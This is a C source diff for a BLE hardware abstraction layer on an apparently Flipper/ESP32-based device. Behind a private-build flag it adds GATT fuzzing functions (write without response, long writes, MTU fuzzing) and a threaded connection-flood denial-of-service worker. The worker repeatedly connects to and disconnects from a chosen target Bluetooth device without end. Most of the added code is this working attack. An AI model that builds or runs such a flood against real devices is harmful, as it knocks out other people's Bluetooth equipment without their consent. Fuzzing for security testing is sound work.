@@ -64,6 +64,18 @@ static uint8_t s_own_addr_type = BLE_OWN_ADDR_PUBLIC;
 static volatile bool s_sync_done = false;
 static uint8_t s_last_connect_addr[6]; /* display order (MSB-first), for logs */
 
+#ifndef PUBLIC_BUILD
+/* ---- Fuzz/DoS state (private-only) --------------------------------------- */
+static volatile uint16_t s_negotiated_mtu = 0;
+
+static FuriThread* s_dos_thread = NULL;
+static volatile bool s_dos_stop = true;
+static volatile uint32_t s_dos_counter = 0;
+static uint8_t s_dos_target_addr[6];
+static uint8_t s_dos_target_addr_type;
+static uint16_t s_dos_hold_count;
+#endif // PUBLIC_BUILD
+
 /* Forward decls */
 static int ble_gap_event(struct ble_gap_event* event, void* arg);
 
@@ -337,6 +349,9 @@ static int ble_gap_event(struct ble_gap_event* event, void* arg) {
 
     case BLE_GAP_EVENT_MTU:
         ESP_LOGI(TAG, "MTU update: %d", event->mtu.value);
+#ifndef PUBLIC_BUILD
+        s_negotiated_mtu = event->mtu.value;
+#endif
         break;
 
     case BLE_GAP_EVENT_NOTIFY_RX:
@@ -791,3 +806,181 @@ bool ble_walk_hal_write_char(uint16_t handle, const uint8_t* data, uint16_t len)
     }
     return true;
 }
+
+#ifndef PUBLIC_BUILD
+// ---------------------------------------------------------------------------
+// GATT fuzz primitives (private-only: new attack surface, not shipped public)
+// ---------------------------------------------------------------------------
+
+bool ble_walk_hal_write_char_norsp(uint16_t handle, const uint8_t* data, uint16_t len) {
+    if(!s_connected) return false;
+
+    // Write Without Response — no ble_gatt_attr_fn completion callback exists
+    // for this procedure at all (fire-and-forget by design), unlike
+    // ble_walk_hal_write_char's write_cb-driven ble_gattc_write_flat.
+    int rc = ble_gattc_write_no_rsp_flat(s_conn_handle, handle, data, len);
+    if(rc != 0) {
+        ESP_LOGE(TAG, "ble_gattc_write_no_rsp_flat rc=%d", rc);
+        return false;
+    }
+    return true;
+}
+
+bool ble_walk_hal_write_char_long(uint16_t handle, uint16_t offset, const uint8_t* data, uint16_t len) {
+    if(!s_connected) return false;
+
+    struct os_mbuf* om = ble_hs_mbuf_from_flat(data, len);
+    if(!om) {
+        ESP_LOGE(TAG, "write_long: ble_hs_mbuf_from_flat failed (len=%d)", len);
+        return false;
+    }
+
+    // ble_gattc_write_long consumes the mbuf regardless of outcome (per its
+    // header doc), so there is no free-on-error path to add here.
+    int rc = ble_gattc_write_long(s_conn_handle, handle, offset, om, write_cb, NULL);
+    if(rc != 0) {
+        ESP_LOGE(TAG, "ble_gattc_write_long rc=%d", rc);
+        return false;
+    }
+    return true;
+}
+
+bool ble_walk_hal_fuzz_mtu(uint16_t preferred_mtu) {
+    if(!s_connected) return false;
+
+    int rc = ble_att_set_preferred_mtu(preferred_mtu);
+    if(rc != 0) {
+        // Not fatal on its own (e.g. value out of the 23..517 range clamps
+        // internally) — still attempt the exchange with whatever is active.
+        ESP_LOGW(TAG, "ble_att_set_preferred_mtu(%d) rc=%d", preferred_mtu, rc);
+    }
+
+    rc = ble_gattc_exchange_mtu(s_conn_handle, ble_walk_mtu_cb, NULL);
+    if(rc != 0) {
+        ESP_LOGE(TAG, "ble_gattc_exchange_mtu rc=%d", rc);
+        return false;
+    }
+    return true;
+}
+
+uint16_t ble_walk_hal_get_negotiated_mtu(void) {
+    return s_negotiated_mtu;
+}
+
+// ---------------------------------------------------------------------------
+// Connection-flood DoS (private-only)
+// ---------------------------------------------------------------------------
+
+/* Runs on its own FuriThread so a scene can fire-and-monitor via the
+ * counter/stop-flag pair instead of blocking its own tick loop. Mirrors
+ * ble_walk_hal_connect's connect/wait/cancel idiom for each cycle, but churns
+ * indefinitely against s_dos_target_addr instead of returning after one
+ * attempt. Shares s_conn_handle/s_connected with the rest of the HAL (this
+ * HAL only ever tracks one live link at a time, same as ble_walk_hal_connect)
+ * — callers must not run a manual connect/walk session concurrently with the
+ * flood. */
+static int32_t dos_flood_worker(void* ctx) {
+    UNUSED(ctx);
+    ESP_LOGI(TAG, "DoS connect-flood worker started");
+
+    while(!s_dos_stop) {
+        if(!s_sync_done) {
+            furi_delay_ms(50);
+            continue;
+        }
+
+        ble_addr_t peer;
+        addr_to_nimble(&peer, s_dos_target_addr, s_dos_target_addr_type);
+
+        s_connected = false;
+        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+
+        int rc = ble_gap_connect(s_own_addr_type, &peer, 3000, NULL, ble_gap_event, NULL);
+        if(rc != 0) {
+            ESP_LOGW(TAG, "dos ble_gap_connect rc=%d", rc);
+            furi_delay_ms(50);
+            continue;
+        }
+
+        // Bounded wait (~3s) for the connect to land, abortable via the stop flag.
+        for(int i = 0; i < 60 && !s_connected && !s_dos_stop; i++) {
+            furi_delay_ms(50);
+        }
+
+        if(s_dos_stop) {
+            if(s_connected) {
+                ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
+            } else {
+                ble_gap_conn_cancel();
+            }
+            break;
+        }
+
+        if(!s_connected) {
+            // Timed out — cancel the still-pending attempt and churn again.
+            ble_gap_conn_cancel();
+            furi_delay_ms(20);
+            continue;
+        }
+
+        __atomic_add_fetch(&s_dos_counter, 1, __ATOMIC_RELAXED);
+
+        // Hold the link open before tearing it down (0 == disconnect
+        // immediately, i.e. max churn rate; each hold_count unit is a 20ms
+        // dwell, so callers dial how "sticky" each connection is).
+        uint32_t hold_ms = (uint32_t)s_dos_hold_count * 20;
+        uint32_t held = 0;
+        while(held < hold_ms && !s_dos_stop) {
+            furi_delay_ms(20);
+            held += 20;
+        }
+
+        if(s_connected && s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
+            ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
+            for(int i = 0; i < 40 && s_connected && !s_dos_stop; i++) {
+                furi_delay_ms(50);
+            }
+        }
+    }
+
+    s_connected = false;
+    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+    ESP_LOGI(TAG, "DoS connect-flood worker stopped (cycles=%u)", (unsigned)s_dos_counter);
+    return 0;
+}
+
+bool ble_walk_hal_dos_connect_flood_start(const BleWalkDevice* target, uint16_t hold_count) {
+    if(!target) return false;
+    if(s_dos_thread) {
+        ESP_LOGW(TAG, "DoS flood already running");
+        return false;
+    }
+
+    memcpy(s_dos_target_addr, target->addr, 6);
+    s_dos_target_addr_type = (uint8_t)target->addr_type;
+    s_dos_hold_count = hold_count;
+    s_dos_counter = 0;
+    s_dos_stop = false;
+
+    s_dos_thread = furi_thread_alloc();
+    furi_thread_set_name(s_dos_thread, "BleDosFlood");
+    furi_thread_set_stack_size(s_dos_thread, 4096);
+    furi_thread_set_callback(s_dos_thread, dos_flood_worker);
+    furi_thread_start(s_dos_thread);
+    return true;
+}
+
+void ble_walk_hal_dos_flood_stop(void) {
+    if(!s_dos_thread) return;
+
+    s_dos_stop = true;
+    furi_thread_join(s_dos_thread);
+    furi_thread_free(s_dos_thread);
+    s_dos_thread = NULL;
+}
+
+uint32_t ble_walk_hal_dos_counter(void) {
+    return s_dos_counter;
+}
+
+#endif // PUBLIC_BUILD
